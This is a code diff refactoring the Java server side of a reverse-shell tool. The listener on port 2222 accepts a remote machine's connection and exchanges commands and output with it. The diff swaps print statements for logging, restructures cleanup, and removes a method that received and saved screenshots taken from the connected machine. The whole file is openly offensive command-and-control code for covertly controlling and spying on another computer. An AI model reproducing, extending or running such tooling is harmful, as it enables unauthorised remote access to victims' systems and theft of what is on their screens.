@@ -1,15 +1,13 @@
 package obs1d1anc1ph3r.reverseshell.server;
 
-import java.awt.image.BufferedImage;
 import java.io.*;
 import java.net.*;
-import java.text.SimpleDateFormat;
-import java.util.Date;
-import javax.imageio.ImageIO;
+import java.util.logging.*;
 
 public class ReverseShellServer {
 
     private static final int SERVER_PORT = 2222;
+    private static final Logger logger = Logger.getLogger(ReverseShellServer.class.getName());
     private ServerSocket serverSocket;
     private Socket clientSocket;
     private BufferedReader in;
@@ -30,28 +28,26 @@ public class ReverseShellServer {
             waitForConnection();
             setupStreams();
 
-            outputReceiver = new Thread(new ResponseHandler(in, out));
+            outputReceiver = new Thread(new ResponseHandler(in, out, clientSocket));
             outputReceiver.start();
 
-            inputHandler = new Thread(new CommandSender(out, userInput));
+            inputHandler = new Thread(new CommandSender(out, userInput, this));
             inputHandler.start();
 
         } catch (IOException e) {
-            System.err.println("[ERROR] Server error: " + e.getMessage());
-        } finally {
-            cleanup();
+            logger.log(Level.SEVERE, "[ERROR] Server error: " + e.getMessage(), e);
         }
     }
 
     private void setupServer() throws IOException {
         serverSocket = new ServerSocket(SERVER_PORT);
-        System.out.println("[*] Server is running on port " + SERVER_PORT);
+        logger.log(Level.INFO, "[-] Server is running on port {0}", SERVER_PORT);
     }
 
     private void waitForConnection() throws IOException {
-        System.out.println("[*] Waiting for incoming connection...");
+        logger.info("[-] Waiting for incoming connection...");
         clientSocket = serverSocket.accept();
-        System.out.println("[+] Connection established with " + clientSocket.getInetAddress());
+        logger.log(Level.INFO, "[-*] Connection established with {0}", clientSocket.getInetAddress());
     }
 
     private void setupStreams() throws IOException {
@@ -61,32 +57,11 @@ public class ReverseShellServer {
         dataIn = new DataInputStream(clientSocket.getInputStream());
     }
 
-    public void receiveScreenshot() {
-        try {
-            System.out.println("[*] Receiving screenshot...");
-
-            int fileSize = dataIn.readInt();
-            byte[] imageBytes = new byte[fileSize];
-            dataIn.readFully(imageBytes);
-
-            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(imageBytes);
-            BufferedImage image = ImageIO.read(byteArrayInputStream);
-
-            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
-            File outputFile = new File("screenshot_" + timestamp + ".png");
-            ImageIO.write(image, "png", outputFile);
-            System.out.println("[+] Screenshot received and saved as " + outputFile.getAbsolutePath());
-
-        } catch (IOException e) {
-            System.err.println("[ERROR] Failed to receive screenshot: " + e.getMessage());
-        }
-    }
-
     public Socket getClientSocket() {
         return clientSocket;
     }
 
-    private void cleanup() {
+    public void cleanup() {
         try {
             if (outputReceiver != null && outputReceiver.isAlive()) {
                 outputReceiver.interrupt();
@@ -96,6 +71,14 @@ public class ReverseShellServer {
                 inputHandler.interrupt();
             }
 
+            closeResources();
+        } catch (IOException e) {
+            logger.log(Level.SEVERE, "[ERROR] Error during cleanup: " + e.getMessage(), e);
+        }
+    }
+
+    private void closeResources() throws IOException {
+        try {
             if (in != null) {
                 in.close();
             }
@@ -114,9 +97,9 @@ public class ReverseShellServer {
             if (serverSocket != null) {
                 serverSocket.close();
             }
-
         } catch (IOException e) {
-            System.err.println("[ERROR] Error closing resources: " + e.getMessage());
+            logger.log(Level.SEVERE, "[ERROR] Error closing resources: " + e.getMessage(), e);
+            throw e;
         }
     }
 }
